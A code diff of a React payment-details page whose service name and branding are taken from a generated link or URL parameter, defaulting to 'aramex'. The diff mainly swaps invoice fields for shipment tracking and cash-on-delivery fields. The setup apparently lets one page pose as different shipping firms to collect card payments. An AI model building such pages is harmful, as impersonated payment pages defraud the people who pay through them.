@@ -5,7 +5,7 @@ import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -13,7 +13,7 @@ const PaymentDetails = () => {
   const { data: linkData } = useLink(id);
 
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
+  const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
@@ -23,11 +23,8 @@ const PaymentDetails = () => {
   // Get currency info for display
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  // Get payment data from link data
-  const paymentData = shippingInfo?.payment_data;
-
-  // Get amount from payment data or shipping info
-  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
+  // Get amount from link data - ensure it's a number, handle all data types
+  const rawAmount = shippingInfo?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -67,44 +64,30 @@ const PaymentDetails = () => {
       description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Payment Data Display */}
-      {(shippingInfo || paymentData) && (
+      {/* Shipping Info Display */}
+      {shippingInfo && (
         <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">بيانات السداد</h3>
+          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
           <div className="space-y-2 text-xs sm:text-sm">
-            {paymentData?.customer_name && (
-              <div className="flex items-center gap-2">
-                <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">الاسم:</span>
-                <span className="font-semibold">{paymentData.customer_name}</span>
-              </div>
-            )}
-            {paymentData?.invoice_number && (
-              <div className="flex items-center gap-2">
-                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">الرقم المفوتر:</span>
-                <span className="font-semibold">{paymentData.invoice_number}</span>
-              </div>
-            )}
-            {paymentData?.selected_service_name && (
-              <div className="flex items-center gap-2">
-                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">الخدمة:</span>
-                <span className="font-semibold">{paymentData.selected_service_name}</span>
-              </div>
-            )}
-            {shippingInfo?.tracking_number && (
+            {shippingInfo.tracking_number && (
               <div className="flex items-center gap-2">
                 <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                 <span className="text-muted-foreground">رقم الشحنة:</span>
                 <span className="font-semibold">{shippingInfo.tracking_number}</span>
               </div>
             )}
-            {shippingInfo?.package_description && (
+            {shippingInfo.package_description && (
               <div className="flex items-center gap-2">
-                <Package className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                 <span className="text-muted-foreground">وصف الطرد:</span>
                 <span className="font-semibold">{shippingInfo.package_description}</span>
+              </div>
+            )}
+            {shippingInfo.cod_amount > 0 && (
+              <div className="flex items-center gap-2">
+                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                <span className="text-muted-foreground">مبلغ COD:</span>
+                <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
               </div>
             )}
           </div>
@@ -113,20 +96,12 @@ const PaymentDetails = () => {
       
       {/* Payment Summary */}
       <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-        {paymentData?.selected_service_name && (
-          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
-            <span className="text-muted-foreground">الخدمة</span>
-            <span className="font-semibold">{paymentData.selected_service_name}</span>
-          </div>
-        )}
-        {!paymentData?.selected_service_name && (
-          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
-            <span className="text-muted-foreground">الخدمة</span>
-            <span className="font-semibold">{serviceName}</span>
-          </div>
-        )}
-
-        <div
+        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
+          <span className="text-muted-foreground">الخدمة</span>
+          <span className="font-semibold">{serviceName}</span>
+        </div>
+        
+        <div 
           className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
           style={{
             background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
